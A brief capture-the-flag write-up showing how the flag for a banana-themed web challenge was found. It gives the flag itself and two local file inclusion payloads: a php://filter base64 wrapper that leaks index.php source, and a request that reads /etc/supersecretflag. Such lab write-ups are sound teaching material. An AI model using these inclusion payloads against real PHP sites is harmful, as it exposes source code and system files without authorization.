# Flag

> **Hacking-Arena{Yammiiee_bananaaa}**

# Prompt

> **I love bananas!!! Can you find out where the flag hides? [http://3cpo.hackingarena.com:805/](http://3cpo.hackingarena.com:805/)**

# Solution

**php filter** wrapping in **PHP** used to read and manipulate files whilst encoding them. 

```
index.php?fruit=php://filter/convert.base64-encode/resource=index.php
```

The url change returns the webpage with a Base64 encoded message which can be decoded through **[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9-_',true,false)&input=UEQ5d2FIQUtJQ0FnYVdZZ0tHbHpjMlYwS0NBa1gwZEZWRnNuWm5KMWFYUW5YU0FwSUNsN0NpQWdJQ0FnSUdsdVkyeDFaR1VvSUNSZlIwVlVXeWRtY25WcGRDZGRLVHNLSUNBZ0x5OWtieUIzWlNCb1lYWmxJQzlsZEdNdmMzVndaWEp6WldOeVpYUm1iR0ZuQ2lBZ0lIMEtQejRLQ2p4aElHaHlaV1k5SW1sdVpHVjRMbkJvY0Q5bWNuVnBkRDFpWVc1aGJtRWlQa2tnZDJGdWRDQmlZVzVoYm1FOEwyRQ)** .

![[Pasted image 20241026225656.png]]

The commented out message lead me to the flag at:

```
http://3cpo.hackingarena.com:805/index.php?fruit=/etc/supersecretflag
```
# Additional Info

Additional solution / info